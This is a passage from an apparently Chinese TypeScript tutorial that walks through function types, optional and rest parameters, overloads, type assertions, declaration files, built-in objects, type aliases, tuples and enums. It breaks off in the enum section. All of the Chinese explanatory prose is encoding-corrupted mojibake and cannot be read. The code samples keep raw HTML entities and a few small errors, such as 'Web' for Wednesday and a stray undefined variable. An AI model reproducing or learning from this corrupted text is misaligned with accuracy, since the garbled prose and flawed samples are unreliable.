mySumï¼Œæ˜¯é€šè¿‡èµ‹å€¼æ“ä½œè¿›è¡Œç±»åž‹æŽ¨è®ºè€ŒæŽ¨æ–­å‡ºæ¥çš„ã€‚å¦‚æžœéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨ç»™ mySum æ·»åŠ ç±»åž‹ï¼Œåˆ™åº”è¯¥æ˜¯è¿™æ ·ï¼š 123let mySum:(x:number, y:number) =&gt; number = function(x: number, y: number) : number&#123; return x + y;&#125; æ³¨æ„ä¸è¦æ··æ·†äº† TypeScript ä¸­çš„ =&gt; å’Œ ES6 ä¸­çš„ =&gt;ã€‚ åœ¨ TypeScript çš„ç±»åž‹å®šä¹‰ä¸­ï¼Œ=&gt; ç”¨æ¥è¡¨ç¤ºå‡½æ•°çš„å®šä¹‰ï¼Œå·¦è¾¹æ˜¯è¾“å…¥ç±»åž‹ï¼Œéœ€è¦ç”¨æ‹¬å·æ‹¬èµ·æ¥ï¼Œå³è¾¹æ˜¯è¾“å‡ºç±»åž‹ã€‚ åœ¨ ES6 ä¸­ï¼Œ=&gt; å«åšç®­å¤´å‡½æ•°ï¼Œåº”ç”¨ååˆ†å¹¿æ³›ï¼Œå¯ä»¥å‚è€ƒ ES6 ä¸­çš„ç®­å¤´å‡½æ•°ã€‚ ç”¨æŽ¥å£å®šä¹‰å‡½æ•°çš„å½¢çŠ¶ä¹Ÿå¯ä»¥ç”¨æŽ¥å£çš„æ–¹å¼æ¥å®šä¹‰ä¸€ä¸ªå‡½æ•°éœ€è¦ç¬¦åˆçš„å½¢å¼ï¼š 1234567interface SearchFunc &#123; (source: string, subString: string): boolean;&#125;let mySearch: SearchFunc;mySearch = function(source: string, subString: string)&#123; return source.search(subString) !== -1;&#125; å¯é€‰å‚æ•°ä¸ŽæŽ¥å£ä¸­çš„å¯é€‰å±žæ€§ç±»ä¼¼ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ ï¼Ÿè¡¨ç¤ºå¯é€‰å‚æ•°ï¼š 12345678function buildName(firstName: string, lastName?: string)&#123; if(lastName)&#123; return `$&#123;firstName&#125; $&#123;lastName&#125;`; &#125; return firstName;&#125;let tomcat = buildName('Tom','cat');let tom = buildName('Tom'); éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯é€‰å‚æ•°å¿…é¡»æŽ¥åœ¨å¿…éœ€å‚æ•°åŽé¢ã€‚æ¢å¥è¯è¯´ï¼Œå¯é€‰å‚æ•°åŽé¢ä¸å…è®¸å†å‡ºçŽ°å¿…é¡»å‚æ•°äº†ï¼š 12345678910function buildName(firstName?: string, lastName: string) &#123; if (firstName) &#123; return firstName + ' ' + lastName; &#125; else &#123; return lastName; &#125;&#125;let tomcat = buildName('Tom', 'Cat');let tom = buildName('Tom', 'Cat');// error TS1016: A required parameter cannot follow an optional parameter. å‚æ•°é»˜è®¤å€¼TypeScript ä¼šå°†æ·»åŠ äº†é»˜è®¤å€¼çš„å‚æ•°è¯†åˆ«ä¸ºå¯é€‰å‚æ•°ï¼š 123456789function buildName(firstName?: string, lastName: string = 'Cat') &#123; if (firstName) &#123; return firstName + ' ' + lastName; &#125; else &#123; return lastName; &#125;&#125;let tomcat = buildName('Tom', 'Cat');let tom = buildName('Tom'); æ­¤æ—¶å°±ä¸å—ã€Œå¯é€‰å‚æ•°å¿…é¡»æŽ¥åœ¨å¿…éœ€å‚æ•°åŽé¢ã€çš„é™åˆ¶äº†ï¼š 123456789function buildName(firstName: string = 'Tom', lastName: string ) &#123; if (firstName) &#123; return firstName + ' ' + lastName; &#125; else &#123; return lastName; &#125;&#125;let tomcat = buildName('Tom', 'Cat');let cat = buildName(undefined, 'Cat'); å‰©ä½™å‚æ•°ES6ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ ...restçš„æ–¹å¼èŽ·å–å‡½æ•°çš„å‰©ä½™å‚æ•°ï¼ˆrestå‚æ•°ï¼‰ 1234567function push(array,...items)&#123; items.forEach(function(item)&#123; array.push(item); &#125;);&#125;let a = [];push(a,1,2,3); äº‹å®žä¸Šï¼Œ itemsæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨æ•°ç»„çš„ç±»åž‹æ¥å®šä¹‰å®ƒï¼š 1234567function push(array: any[],...items: any[])&#123; items.forEach(function(item)&#123; array.push(item); &#125;);&#125;let a = [];push(a,1,2,3); æ³¨æ„ï¼Œrest å‚æ•°åªèƒ½æ˜¯æœ€åŽä¸€ä¸ªå‚æ•°ï¼Œå…³äºŽ rest å‚æ•°ï¼Œå¯ä»¥å‚è€ƒ ES6 ä¸­çš„ rest å‚æ•°ã€‚ é‡è½½é‡è½½å…è®¸ä¸€ä¸ªå‡½æ•°æŽ¥å—ä¸åŒçš„æ•°é‡æˆ–è€…ç±»åž‹çš„å‚æ•°ï¼Œåšä¸åŒçš„å¤„ç† æ¯”å¦‚ï¼Œæˆ‘ä»¬éœ€è¦å®žçŽ°ä¸€ä¸ªå‡½æ•° reverseï¼Œè¾“å…¥æ•°å­— 123 çš„æ—¶å€™ï¼Œè¾“å‡ºåè½¬çš„æ•°å­— 321ï¼Œè¾“å…¥å­—ç¬¦ä¸² &#39;hello&#39; çš„æ—¶å€™ï¼Œè¾“å‡ºåè½¬çš„å­—ç¬¦ä¸² &#39;olleh&#39;ã€‚ åˆ©ç”¨è”åˆç±»åž‹ï¼Œæˆ‘ä»¬å¯ä»¥è¿™ä¹ˆå®žçŽ°ï¼š 1234567function reverse(x: number| string): number| string&#123; if(typeof x === 'number')&#123; return Number(x.toString().split('').reverse().join('')) &#125;else if(typeof x === 'string')&#123; return x.split('').reverse().join(''); &#125;&#125; ç„¶è€Œè¿™æ ·æœ‰ä¸€ä¸ªç¼ºç‚¹ï¼Œå°±æ˜¯ä¸èƒ½å¤Ÿç²¾ç¡®çš„è¡¨è¾¾ï¼Œè¾“å…¥ä¸ºæ•°å­—çš„æ—¶å€™ï¼Œè¾“å‡ºä¹Ÿåº”è¯¥ä¸ºæ•°å­—ï¼Œè¾“å…¥ä¸ºå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œè¾“å‡ºä¹Ÿåº”è¯¥ä¸ºå­—ç¬¦ä¸²ã€‚ è¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨é‡è½½å®šä¹‰å¤šä¸ª reverse çš„å‡½æ•°ç±»åž‹ï¼š 123456789function reverse(x: number): number;function reverse(x: string): string;function reverse(x: number | string) : number | string&#123; if(typeof x === 'number')&#123; return Number(x.toString().split('').reverse().join('')); &#125;else if(typeof x === 'string')&#123; return x.split('').reverse().join(''); &#125;&#125; ä¸Šä¾‹ä¸­å—ï¼Œæˆ‘ä»¬é‡å¤äº†å¤šæ¬¡å‡½æ•° reverseçš„å®šä¹‰ï¼Œå‰å‡ æ¬¡éƒ½æ˜¯å‡½æ•°çš„å®šä¹‰ï¼Œæœ€åŽä¸€æ¬¡æ˜¯å‡½æ•°çš„å®žçŽ°ã€‚ æ³¨æ„ï¼ŒTypeScript ä¼šä¼˜å…ˆä»Žæœ€å‰é¢çš„å‡½æ•°å®šä¹‰å¼€å§‹åŒ¹é…ï¼Œæ‰€ä»¥å¤šä¸ªå‡½æ•°å¦‚æžœæœ‰åŒ…å«å…³ç³»ï¼Œéœ€ä¼˜å…ˆæŠŠç²¾ç¡®çš„å®šä¹‰å†™åœ¨å‰é¢ã€‚ ç±»åž‹æ–­è¨€ç±»åž‹æ–­è¨€ï¼ˆType Assertionï¼‰ å¯ä»¥ç”¨æ¥æ‰‹åŠ¨æŒ‡å®šä¸€ä¸ªå€¼çš„ç±»åž‹ è¯­æ³•1&lt;ç±»åž‹&gt; å€¼ æˆ– 1å€¼ as ç±»åž‹ åœ¨ tsx è¯­æ³•ä¸­å¿…é¡»ä½¿ç”¨åŽä¸€ç§ ä¾‹å­ï¼šå°†ä¸€ä¸ªè”åˆç±»åž‹çš„å˜é‡æŒ‡å®šä¸ºä¸€ä¸ªæ›´åŠ å…·ä½“çš„ç±»åž‹å½“TypeScript ä¸ç¡®å®šä¸€ä¸ªè”åˆç±»åž‹çš„å˜é‡åˆ°åº•æ˜¯é‚£ä¸ªç±»åž‹çš„çš„æ—¶å€™ï¼Œæˆ‘ä»¬åªèƒ½è®¿é—®æ¬¡è”åˆç±»åž‹çš„æ‰€æœ‰ç±»åž‹é‡Œå…±æœ‰çš„å±žæ€§æˆ–æ–¹æ³•: 12345function getLength(something: string|number) :number&#123; return something.length;&#125;// rror TS2339: Property 'length' does not exist on type 'string | number'.// Property 'length' does not exist on type 'number'. è€Œæœ‰æ—¶å€™ï¼Œæˆ‘ä»¬ç¡®å®žéœ€è¦åœ¨è¿˜ä¸ç¡®å®šç±»åž‹çš„æ—¶å€™å°±è®¿é—®ä¸€ä¸ªç±»åž‹çš„å±žæ€§æˆ–è€…æ˜¯æ–¹æ³•ï¼šæ¯”å¦‚ï¼š 12345678function getLength(something: string|number) :number&#123; if(something.length)&#123; return something.length; &#125;else&#123; return something.toString().length; &#125; &#125;// è¿˜æ˜¯æŠ¥ä¸Šé¢çš„é”™ï¼Œä¸è¿‡æŠ¥é”™çš„ä½ç½®æ˜¯ä¸¤å¤„ ä¸Šä¾‹ä¸­ï¼ŒèŽ·å– something.lengthçš„æ—¶å€™ä¼šæŠ¥é”™ æ­¤æ—¶å¯ä»¥ä½¿ç”¨ç±»åž‹æ–­è¨€ï¼Œå°† somethingæ–­è¨€æˆ string 12345678function getLength(something: string|number) :number&#123; if((&lt;string&gt;something).length)&#123; return (&lt;string&gt;something).length; &#125;else&#123; return something.toString().length; &#125; &#125; ç±»åž‹æ–­è¨€çš„ç”¨æ³•å¦‚ä¸Šï¼Œåœ¨éœ€è¦æ–­è¨€çš„å˜é‡ä¸ŠåŠ ä¸Š &lt;type&gt;å³å¯ã€‚ ç±»åž‹æ–­è¨€ä¸æ˜¯ç±»åž‹è½¬æ¢ï¼Œæ–­è¨€æˆä¸€ä¸ªè”åˆç±»åž‹ä¸­ä¸å­˜åœ¨çš„ç±»åž‹æ˜¯ä¸å…è®¸çš„ 1234function toBoolean(something: string | number): boolean &#123; return &lt;boolean&gt;something;&#125;// Conversion of type 'string | number' to type 'boolean' may be a mistake because neither type sufficiently overlaps with the other. If this was intentional, convert the expression to 'unknown' first.Type 'number' is not comparable to type 'boolean'. å£°æ˜Žæ–‡ä»¶å½“ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å¼•ç”¨å®ƒçš„å£°æ˜Žæ–‡ä»¶ å£°æ˜Žè¯­å¥ ä¾‹å¦‚æ˜¯ jQuerty ï¼Œæˆ‘ä»¬é€šå¸¸è¿™æ ·èŽ·å–ä¸€ä¸ª idæ˜¯ fooçš„å…ƒç´ ï¼š 123$('#foo');// orjQuery('#foo'); ä½†æ˜¯åœ¨ TypeScript ä¸­ï¼Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“ $æˆ– jQueryæ˜¯ä»€ä¹ˆä¸œè¥¿ï¼š 12jQuery('#foo');// Cannot find name 'jQuery'. è¿™æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ declareå…³é”®å­—æ¥å®šä¹‰å®ƒçš„ç±»åž‹ï¼Œå¸®åŠ© TypeScript åˆ¤æ–­æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ç±»åž‹å¯¹ä¸å¯¹ï¼š 12declare var jQuery: (selector: string) =&gt; any;jQuery('#foo'); declare å®šä¹‰çš„ç±»åž‹åªä¼šç”¨äºŽç¼–è¯‘æ—¶çš„æ£€æŸ¥ï¼Œç¼–è¯‘ç»“æžœä¸­ä¼šè¢«åˆ é™¤ã€‚ ä¸Šä¾‹çš„ç¼–è¯‘ç»“æžœæ˜¯ï¼š 1jQuery('#foo'); å£°æ˜Žæ–‡ä»¶ é€šå¸¸æˆ‘ä»¬ä¼šåœ¨ç±»åž‹å£°æ˜Žæ”¾åˆ°ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ä¸­ï¼Œè¿™å°±æ˜¯å£°æ˜Žæ–‡ä»¶ï¼š 12// jQuery.d.tsdeclare var jQuery:(string) =&gt; any; æˆ‘ä»¬çº¦å®šå£°æ˜Žæ–‡ä»¶æ˜¯ä»¥ .d.tsä¸ºåŽç¼€ ç„¶åŽåœ¨ä½¿ç”¨çš„æ–‡ä»¶å¼€å¤´ï¼Œç”¨ã€Œä¸‰æ–œçº¿æŒ‡ä»¤ã€è¡¨ç¤ºå¼•ç”¨äº†å£°æ˜Žæ–‡ä»¶ï¼š 123/// &lt;reference path='./jQuery.d.ts'/&gt;jQuery('#foo'); ç¬¬ä¸‰æ–¹å£°æ˜Žæ–‡ä»¶å½“ç„¶ï¼ŒjQuery çš„å£°æ˜Žæ–‡ä»¶ä¸éœ€è¦æˆ‘ä»¬å®šä¹‰äº†ï¼Œå·²ç»æœ‰äººå¸®æˆ‘ä»¬å®šä¹‰å¥½äº†ï¼šjQuery in DefinitelyTypedã€‚ æˆ‘ä»¬å¯ä»¥ç›´æŽ¥ä¸‹è½½ä¸‹æ¥ä½¿ç”¨ï¼Œä½†æ˜¯æ›´æŽ¨èçš„æ˜¯ä½¿ç”¨å·¥å…·ç»Ÿä¸€ç®¡ç†ç¬¬ä¸‰æ–¹åº“çš„å£°æ˜Žæ–‡ä»¶ã€‚ ç¤¾åŒºå·²ç»æœ‰å¤šç§æ–¹å¼å¼•å…¥å£°æ˜Žæ–‡ä»¶ï¼Œä¸è¿‡ TypeScript 2.0 æŽ¨èä½¿ç”¨ @types æ¥ç®¡ç†ã€‚ @types çš„ä½¿ç”¨æ–¹å¼å¾ˆç®€å•ï¼Œç›´æŽ¥ç”¨ npm å®‰è£…å¯¹åº”çš„å£°æ˜Žæ¨¡å—å³å¯ï¼Œä»¥ jQuery ä¸¾ä¾‹ï¼š 1npm i @types/jquery --S -D å¯ä»¥åœ¨è¿™ä¸ªé¡µé¢æœç´¢ä½ éœ€è¦çš„å£°æ˜Žæ–‡ä»¶ã€‚ å†…ç½®å¯¹è±¡JavaScript ä¸­æœ‰å¾ˆå¤šå†…ç½®å¯¹è±¡ï¼Œå®ƒä»¬å¯ä»¥ç›´æŽ¥åœ¨ TypeScript ä¸­å½“åšå®šä¹‰å¥½äº†çš„ç±»åž‹ã€‚ å†…ç½®å¯¹è±¡æ˜¯æŒ‡æ ¹æ®æ ‡å‡†åœ¨å…¨å±€ä½œç”¨åŸŸï¼ˆGlobalï¼‰ä¸Šå­˜åœ¨çš„å¯¹è±¡ã€‚è¿™é‡Œçš„æ ‡å‡†æ˜¯æŒ‡ ECMAScript å’Œå…¶ä»–çŽ¯å¢ƒï¼ˆæ¯”å¦‚ DOMï¼‰çš„æ ‡å‡†ã€‚ ECMAScript çš„å†…ç½®å¯¹è±¡ECMAScript æ ‡å‡†æä¾›çš„å†…ç½®å¯¹è±¡æœ‰ï¼š Booleanã€Errorã€Dateã€RegExpç­‰ã€‚ æˆ‘ä»¬å¯ä»¥åœ¨ TypeScript ä¸­å°†å˜é‡å®šä¹‰ä¸ºè¿™äº›ç±»åž‹ï¼š 1234let b : Boolean = new Boolean(1);let e : Error = new Error('Error occurred');let d : Date = new Date();let r : RegExp = /[a-z]/; æ›´å¤šçš„å†…ç½®å¯¹è±¡ï¼Œå¯ä»¥æŸ¥çœ‹ MDN çš„æ–‡æ¡£ã€‚ è€Œä»–ä»¬çš„å®šä¹‰æ–‡ä»¶ï¼Œåˆ™åœ¨ TypeScript æ ¸å¿ƒåº“çš„å®šä¹‰æ–‡ä»¶ä¸­ã€‚ DOM ä¸Ž BOM çš„å†…ç½®å¯¹è±¡ DOM å’Œ BOM æä¾›çš„å†…ç½®å¯¹è±¡ï¼š Documentã€HTMLElementã€Eventã€NodeListç­‰ã€‚ TypeScript ä¸­ä¼šç»å¸¸ä½¿ç”¨åˆ°è¿™äº›ç±»åž‹ï¼š 12345let body: HTMLElement = document.body;let allDiv: NodeList = document.querySelectorAll('div');document.addEventListener('click',function(e:MouseEvent)&#123; // do something&#125;); å®ƒä»¬çš„å®šä¹‰æ–‡ä»¶åŒæ ·åœ¨ TypeScript æ ¸å¿ƒåº“çš„å®šä¹‰æ–‡ä»¶ä¸­ã€‚ TypeScript æ ¸å¿ƒåº“çš„å®šä¹‰æ–‡ä»¶TypeScript æ ¸å¿ƒåº“çš„å®šä¹‰æ–‡ä»¶ä¸­å®šä¹‰äº†æ‰€æœ‰æµè§ˆå™¨çŽ¯å¢ƒéœ€è¦ç”¨åˆ°çš„ç±»åž‹ï¼Œå¹¶ä¸”æ˜¯é¢„ç½®åœ¨ TypeScript ä¸­çš„ã€‚ å½“ä½ åœ¨ä½¿ç”¨ä¸€äº›å¸¸ç”¨çš„æ–¹æ³•çš„æ—¶å€™ï¼ŒTypeScript å®žé™…ä¸Šå·²ç»å¸®ä½ åšäº†å¾ˆå¤šç±»åž‹åˆ¤æ–­çš„å·¥ä½œäº†ï¼Œæ¯”å¦‚ï¼š 12Math.pow(10,'2');// error TS2345: Argument of type '"2"' is not assignable to parameter of type 'number'. ä¸Šé¢çš„ä¾‹å­ä¸­ï¼ŒMath.pow å¿…é¡»æŽ¥å—ä¸¤ä¸ª number ç±»åž‹çš„å‚æ•°ã€‚äº‹å®žä¸Š Math.pow çš„ç±»åž‹å®šä¹‰å¦‚ä¸‹ï¼š 12345678interface Math &#123; /** * Returns the value of a base expression taken to a specified power. * @param x The base value of the expression. * @param y The exponent value of the expression. */ pow(x: number, y: number): number;&#125; å†ä¸¾ä¸€ä¸ª DOM ä¸­çš„ä¾‹å­ï¼š 1234document.addEventListener('click',function(e:MouseEvent)&#123; console.log(e.targetCurrent);&#125;);// error TS2339: Property 'targetCurrent' does not exist on type 'MouseEvent'. ä¸Šé¢çš„ä¾‹å­ä¸­ï¼ŒaddEventListener æ–¹æ³•æ˜¯åœ¨ TypeScript æ ¸å¿ƒåº“ä¸­å®šä¹‰çš„ï¼š 123interface Document extends Node, GlobalEventHandlers, NodeSelector, DocumentEvent &#123; addEventListener(type: string, listener: (ev: MouseEvent) =&gt; any, useCapture?: boolean): void;&#125; æ‰€ä»¥ e è¢«æŽ¨æ–­æˆäº† MouseEventï¼Œè€Œ MouseEvent æ˜¯æ²¡æœ‰ targetCurrent å±žæ€§çš„ï¼Œæ‰€ä»¥æŠ¥é”™äº†ã€‚æ³¨æ„ï¼ŒTypeScript æ ¸å¿ƒåº“çš„å®šä¹‰ä¸­ä¸åŒ…å« Node.js éƒ¨åˆ†ã€‚ ç”¨ TypeScript å†™ Node.jsNode.js ä¸æ˜¯å†…ç½®å¯¹è±¡ä¸€éƒ¨åˆ†ï¼Œå¦‚æžœæƒ³ç”¨ TypeScript å†™ Node.jsï¼Œåˆ™éœ€è¦å¼•å…¥ç¬¬ä¸‰æ–¹å£°æ˜Žæ–‡ä»¶ï¼š 1npm i @types/node -S -D è¿›é˜¶æœ¬éƒ¨åˆ†ä»‹ç»ä¸€äº›é«˜çº§çš„ç±»åž‹ä¸ŽæŠ€æœ¯ï¼Œå…·ä½“å†…å®¹åŒ…æ‹¬ï¼š ç±»åž‹åˆ«å å­—ç¬¦ä¸²å­—é¢é‡ç±»åž‹ å…ƒç»„ æžšä¸¾ ç±» ç±»ä¸ŽæŽ¥å£ æ³›åž‹ å£°æ˜Žåˆå¹¶ ç±»åž‹åˆ«åç±»åž‹åˆ«åå¯ä»¥ç”¨ä¸ªä¸€ä¸ªç±»åž‹èµ·æ–°åå­— ç®€ç­”çš„ä¾‹å­ 12345678910type Name = string;type NameResolver = ()=&gt; string;type NameOrResolver = Name | NameResolver;function getName(n: NameOrResolver): Name&#123; if(typeof n === 'string')&#123; return n; &#125;else &#123; return n(); &#125;&#125; ä¸Šä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ typeåˆ›å»ºç±»åž‹åˆ«åã€‚ ç±»åž‹åˆ«åå¸¸ç”¨äºŽè”åˆç±»åž‹ã€‚ å­—ç¬¦ä¸²å­—é¢é‡ç±»åž‹å­—ç¬¦ä¸²å­—é¢é‡ç±»åž‹ç”¨æ¥çº¦æŸå–å€¼åªèƒ½æ˜¯æŸå‡ ä¸ªå­—ç¬¦ä¸²ä¸­çš„ä¸€ä¸ª ç®€å•çš„ä¾‹å­1234567type EventNames = 'click' | 'scroll' | 'mouseover';function handleEvent(ele:Element,event:EventNames)&#123; // do something&#125;handleEvent(document.getElementById('hello'),'scroll');handleEvent(document.getElementById('world'),'dbclick');// Argument of type '"dbclick"' is not assignable to parameter of type 'EventNames'. ä¸Šä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ typeå®šäº†å­—ç¬¦ä¸²å­—é¢é‡ç±»åž‹ EventNames,å®ƒåªèƒ½å–ä¸‰ç§å­—ç¬¦ä¸²ä¸­çš„ä¸€ç§ æ³¨æ„ï¼Œç±»åž‹åˆ«åä¸Žå­—ç¬¦ä¸²å­—é¢é‡ç±»åž‹éƒ½æ˜¯ä½¿ç”¨ typeè¿›è¡Œå®šä¹‰ å…ƒç»„æ•°ç»„åˆå¹¶äº†ç›¸åŒç±»åž‹çš„å¯¹è±¡ï¼Œè€Œå…ƒç»„ï¼ˆTupleï¼‰åˆå¹¶äº† ä¸åŒç±»åž‹çš„å¯¹è±¡ å…ƒç»„èµ·æºäºŽå‡½æ•°ç¼–ç¨‹è¯­è¨€ï¼ˆå¦‚ F#ï¼‰ï¼Œåœ¨è¿™äº›è¯­è¨€ä¸­é¢‘ç¹åœ°ä½¿ç”¨å…ƒç»„ã€‚ ç®€å•çš„ä¾‹å­å®šä¹‰ä¸€å€¼åˆ†åˆ«ä¸º string å’Œ numberçš„å…ƒç»„ï¼š 1let lbh : [string, number] = ['lbh',23]; å½“èµ‹å€¼æˆ–è®¿é—®ä¸€ä¸ªå·²çŸ¥ç´¢å¼•çš„å…ƒç´ æ—¶ï¼Œä¼šå¾—åˆ°æ­£ç¡®çš„ç±»åž‹ï¼š 12345let lbh : [string, number];lbh[0] = 'l bh'lbh[1] = 25;lbh[0].slice(1);lbh[1].toFixed(1); ä¹Ÿå¯ä»¥åªèµ‹å€¼å…¶ä¸­ä¸€é¡¹ï¼š 12let lbh : [string, number];lbh[0] = 'l bh' ä½†æ˜¯å½“ç›´æŽ¥å¯¹å…ƒç»„ç±»åž‹çš„å˜é‡è¿›è¡Œåˆå§‹åŒ–æˆ–è€…èµ‹å€¼çš„æ—¶å€™ï¼Œéœ€è¦æä¾›æ‰€æœ‰å…ƒç»„ç±»åž‹ä¸­æŒ‡å®šçš„é¡¹ï¼š 12let lbh: [string,number] = ['l bh'];// error TS2322: Type '[string]' is not assignable to type '[string, number]'.Property '1' is missing in type '[string]'. 1234let lbh: [string,number];lbh = ['l bh'];xcatliu[1] = 25;// TS2322: Type '[string]' is not assignable to type '[string, number]'.Property '1' is missing in type '[string]'. è¶Šç•Œçš„å…ƒç´ å½“æ·»åŠ è¶Šç•Œçš„å…ƒç´ æ—¶ï¼Œå®ƒçš„ç±»åž‹ä¼šè¢«é™åˆ¶ä¸ºå…ƒç»„ä¸­çš„æ¯ä¸ªç±»åž‹çš„è”åˆç±»åž‹ï¼š 12345let lbh: [string,number];lbh = ['lbh',23];lbh.push('http://laibh.top');lbh.push(true);// error TS2345: Argument of type 'true' is not assignable to parameter of type 'string | number'. æžšä¸¾æžšä¸¾ï¼ˆEnumï¼‰ç±»åž‹ç”¨äºŽå–å€¼è¢«é™å®šåœ¨ä¸€å®šçš„èŒƒå›´å†…çš„åœºæ™¯ï¼Œæ¯”å¦‚ä¸€å‘¨åªèƒ½æœ‰ä¸ƒå¤©ï¼Œé¢œè‰²é™å®šä¸ºçº¢è“ç»¿ç­‰ã€‚ ç®€å•çš„ä¾‹å­æžšä¸¾ä½¿ç”¨ enumå…³é”®å­—æ¥å®šä¹‰ï¼š 1enum Days&#123;Sun,Mon,Tue,Web,Thu,Fri,Sat&#125;; ç¼–è¯‘åŽï¼š 12345678910var Days;(function (Days) &#123; Days[Days["Sun"] = 0] = "Sun"; Days[Days["Mon"] = 1] = "Mon"; Days[Days["Tue"] = 2] = "Tue"; Days[Days["Web"] = 3] = "Web"; Days[Days["Thu"] = 4] = "Thu"; Days[Days["Fri"] = 5] = "Fri"; Days[Days["Sat"] = 6] = "Sat";&#125;)(Days || (Days = &#123;&#125;)); æžšä¸¾å¯¹è±¡ä¼šè¢«èµ‹å€¼ä¸ºä»Ž 0å¼€å§‹é€’å¢žçš„æ•°å­—ï¼ŒåŒæ—¶ä¹Ÿä¼šè¢«æžšä¸¾å€¼åˆ°æžšä¸¾åè¿›è¡Œåå‘æ˜ å°„: 1234567891011enum Days &#123;Sun, Mon, Tue, Wed, Thu, Fri, Sat&#125;;console.log(Days["Sun"] === 0); // trueconsole.log(Days["Mon"] === 1); // trueconsole.log(Days["Tue"] === 2); // trueconsole.log(Days["Sat"] === 6); // trueconsole.log(Days[0] === "Sun"); // trueconsole.log(Days[1] === "Mon"); // trueconsole.log(Days[2] === "Tue"); // trueconsole.log(Days[6] === "Sat"); // true æ‰‹åŠ¨èµ‹å€¼ æˆ‘ä»¬ä¹Ÿå¯ä»¥ç»™æžšä¸¾é¡¹æ‰‹åŠ¨èµ‹å€¼ï¼š 123456enum Days &#123;Sun = 7, Mon = 1, Tue, Wed, Thu, Fri, Sat&#125;;console.log(Days["Sun"] === 7); // trueconsole.log(Days["Mon"] === 1); // trueconsole.log(Days["Tue"] === 2); // trueconsole.log(Days["Sat"] === 6); // true ä¸Šé¢ä¾‹å­ä¸­ï¼Œæœªæ‰‹åŠ¨èµ‹å€¼çš„æžšä¸¾é¡¹ä¼šæŽ¥ç€ä¸Šä¸€ä¸ªæžšä¸¾é€’å¢žã€‚ å¦‚æžœæœªæ‰‹åŠ¨èµ‹å€¼çš„æžšä¸¾é¡¹ä¸Žæ‰‹åŠ¨èµ‹å€¼çš„é‡å¤äº†ï¼ŒTypeScript æ˜¯ä¸ä¼šå¯Ÿè§‰åˆ°è¿™ä¸€ç‚¹çš„ï¼š 123456enum Days &#123;Sun = 3, Mon = 1, Tue, Wed, Thu, Fri, Sat&#125;;console.log(Days["Sun"] === 3); // trueconsole.log(Days["Wed"] === 3); // trueconsole.log(Days[3] === "Sun"); // falseconsole.log(Days[3] === "Wed"); // true ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œé€’å¢žåˆ° 3 çš„æ—¶å€™ä¸Žå‰é¢çš„ Sun çš„å–å€¼é‡å¤äº†ï¼Œä½†æ˜¯ TypeScript å¹¶æ²¡æœ‰æŠ¥é”™ï¼Œå¯¼è‡´ Days[3] çš„å€¼å…ˆæ˜¯ &quot;Sun&quot;ï¼Œè€ŒåŽåˆè¢« &quot;Wed&quot; è¦†ç›–äº†ã€‚ç¼–è¯‘çš„ç»“æžœæ˜¯ï¼š 12345678910var Days;(function (Days) &#123; Days[Days[&quot;Sun&quot;] = 3] = &quot;Sun&quot;; Days[Days[&quot;Mon&quot;] = 1] = &quot;Mon&quot;; Days[Days[&quot;Tue&quot;] = 2] = &quot;Tue&quot;; Days[Days[&quot;Wed&quot;] = 3] = &quot;Wed&quot;; Days[Days[&quot;Thu&quot;] = 4] = &quot;Thu&quot;; Days[Days[&quot;Fri&quot;] = 5] = &quot;Fri&quot;; Days[Days[&quot;Sat&quot;] = 6] = &quot;Sat&quot;;&#125;)(Days || (Days = &#123;&#125;)); æ‰€ä»¥ä½¿ç”¨çš„æ—¶å€™éœ€è¦æ³¨æ„ï¼Œæœ€å¥½ä¸è¦å‡ºçŽ°è¿™ç§è¦†ç›–çš„æƒ…å†µã€‚ æ‰‹åŠ¨èµ‹å€¼çš„æžšä¸¾é¡¹å¯ä»¥ä¸æ˜¯æ•°å­—ï¼Œæ­¤æ—¶éœ€è¦ä½¿ç”¨ç±»åž‹æ–­è¨€æ¥è®©tscæ— è§†ç±»åž‹æ£€æŸ¥ (ç¼–è¯‘å‡ºçš„jsä»ç„¶æ˜¯å¯ç”¨çš„)ï¼š 1enum Days &#123;Sun = 7, Mon, Tue, Wed, Thu, Fri, Sat = &lt;any&gt;"S"&#125;; 12345678910var Days;(function (Days) &#123; Days[Days["Sun"] = 7] = "Sun"; Days[Days["Mon"] = 8] = "Mon"; Days[Days["Tue"] = 9] = "Tue"; Days[Days["Wed"] = 10] = "Wed"; Days[Days["Thu"] = 11] = "Thu"; Days[Days["Fri"] = 12] = "Fri"; Days[Days["Sat"] = "S"] = "Sat";&#125;)(Days || (Days = &#123;&#125;)); å½“ç„¶ï¼Œæ‰‹åŠ¨èµ‹å€¼çš„æžšä¸¾é¡¹ä¹Ÿå¯ä»¥ä¸ºå°æ•°æˆ–è€…æ˜¯è´Ÿæ•°ï¼Œæ­¤æ—¶åŽç»­æœªæ‰‹åŠ¨èµ‹å€¼çš„ä½Žå¢žé•¿ä»ä¸º 1: 1enum Days &#123;Sun = 7,Mon = 1.5,Tue, Wed, Thu, Fri, Sat&#125; 12345678910var Days;(function (Days) &#123; Days[Days["Sun"] = 7] = "Sun"; Days[Days["Mon"] = 1.5] = "Mon"; Days[Days["Tue"] = 2.5] = "Tue"; Days[Days["Wed"] = 3.5] = "Wed"; Days[Days["Thu"] = 4.5] = "Thu"; Days[Days["Fri"] = 5.5] = "Fri"; Days[Days["Sat"] = 6.5] = "Sat";&#125;)(Days || (Days = &#123;&#125;)); å¸¸æ•°é¡¹å’Œè®¡ç®—æ‰€å¾—é¡¹ æžšä¸¾é¡¹æœ‰ä¸¤ç§ç±»åž‹ï¼šå¸¸æ•°é¡¹ï¼ˆconstant memberï¼‰å’Œ ï¼ˆcomputed memberï¼‰ 